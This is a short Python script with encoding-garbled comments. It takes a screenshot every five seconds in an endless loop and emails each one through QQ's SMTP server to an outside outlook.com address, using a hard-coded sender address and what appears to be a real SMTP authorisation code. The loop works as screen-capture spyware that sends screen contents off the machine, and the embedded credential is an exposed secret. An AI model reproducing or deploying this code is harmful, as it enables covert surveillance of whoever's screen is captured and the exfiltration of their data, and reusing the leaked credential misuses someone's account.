# -*- coding: gbk -*-
import smtplib
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
# ��ͼ
import time
from PIL import ImageGrab


def smtp_s():
    fromaddr = '2845816276@qq.com'  # ���ͷ�
    password = 'jtzxbcjrvyxrdfcc'  # ����1��ȡ����Ȩ��
    toaddrs = ['albertwusuowei@outlook.com']  # �ʼ����ܷ������ַ��ע����Ҫ[]����������ζ�������д����ʼ���ַȺ��
    content = '��������'
    textApart = MIMEText(content)

    imageFile = r"D:\\1.png"  # r ��ʾԭ���ַ���������ת��
    imageApart = MIMEImage(open(imageFile, 'rb').read(), imageFile.split('.')[-1])
    imageApart.add_header('Content-Disposition', 'attachment', filename="��Ļ��ͼ.png")

    m = MIMEMultipart()
    m.attach(textApart)  # �ı�
    m.attach(imageApart)  # ����ͼƬ����

    m['Subject'] = '����'
    # m['From'] = "��Ѷ"
    try:
        server = smtplib.SMTP('smtp.qq.com')
        server.login(fromaddr, password)
        server.sendmail(fromaddr, toaddrs, m.as_string())
        print('���ͳɹ���')
        server.quit()
    except smtplib.SMTPException as e:
        print('error:', e)  # ��ӡ����


# ��ͼ
def imG():
    i = 1
    while True:
        im = ImageGrab.grab()
        im.save('D:\\1.png')
        print("��%d����Ļ��ȡ�ɹ���" % i)
        time.sleep(5)
        i = i + 1
        smtp_s()


if __name__ == '__main__':
    imG()
